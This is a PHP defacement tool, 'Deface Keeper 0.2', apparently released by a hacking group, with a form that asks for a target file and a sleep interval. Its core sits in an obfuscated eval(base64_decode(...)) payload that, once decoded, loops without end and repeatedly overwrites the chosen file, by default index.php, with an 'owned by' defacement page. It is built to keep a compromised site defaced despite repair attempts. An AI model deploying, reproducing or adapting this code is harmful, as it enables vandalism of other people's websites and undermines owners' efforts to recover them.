
<html><title>Deface Keeper 0.2</title>
<style>body{background-color:#333333;color:#999999;}
input{color:#cccccc;
border:1px solid #666666;
background-color:#000000;
}</style>
<p align=center>
<font face="Courier New" size="2">
<p align=center>Deface Keeper 0.2</p>
<p align=center>-=[definside editi0n]=-</p>
</font>
<b>//
<pre>
<form method="post" align="center">
<img src="http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png" align="center">
target fi1e:<br><input type="text" name="target" value="index.php"></br>
s1eeep time:<br><input type="text" name="sleeep" value="1"></br>
<input type="submit" value="Keep Deface" >

Idea & Design: wt0vremr
C0de & Release: Floord
� 2010, <a href="http://www.k0d.cc">www.k0d.cc</a></form>
<?php
// Keeps your deface
eval(base64_decode("ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9kSEoxWlNrN0RRcHpa
WFJmZEdsdFpWOXNhVzFwZENnd0tUc05DbWxtS0NGbGJYQjBlU2drDQpYMUJQVTFSYkozUmhjbWRs
ZENkZEtTa05DbnNOQ25kb2FXeGxLSFJ5ZFdVcERRcDdEUW9rWm5BZ1BTQm1iM0JsYmlna1gxQlBV
MVJiDQpKM1JoY21kbGRDZGRMQ0FuZHljcE93MEtKR1JsWm1GalpTQTlJQ0k4YUhSdGJENDhhR1Zo
WkQ0OGRHbDBiR1UrTUhkdVpXUWdZbmtnDQphekJrTG1OalBDOTBhWFJzWlQ0OEwyaGxZV1ErUEhB
Z1lXeHBaMjQ5WENKalpXNTBaWEpjSWo0OGFXMW5JSE55WXoxb2RIUndPaTh2DQpaMjl2WjJ4bExt
NXRMbkoxTDJsdFlXZGxjeTloZG1GamNtOTNNUzVxY0djK1BDOXBiV2MrUEdadmJuUWdabUZqWlQx
Y0lrTnZkWEpwDQpaWEpjSWo0OGNDQmhiR2xuYmoxY0ltTmxiblJsY2x3aVBqeGlQbVJsWm1GalpT
QmllU0JyTUdRdVkyTWdkR1ZoYlR3dllqNDhMM0ErDQpQQzltYjI1MFBqd3ZjRDQ4TDJKdlpIaytQ
QzlvZEcxc1BpSTdEUXBtZDNKcGRHVW9KR1p3TENBa1pHVm1ZV05sS1RzTkNtWmpiRzl6DQpaU2dr
Wm5BcE93MEtjMnhsWlhBb0pGOVFUMU5VV3lkemJHVmxaWEFuWFNrN0RRcDlEUXA5IikpOw=="));
?>
</b></pre>
</p>
</html> 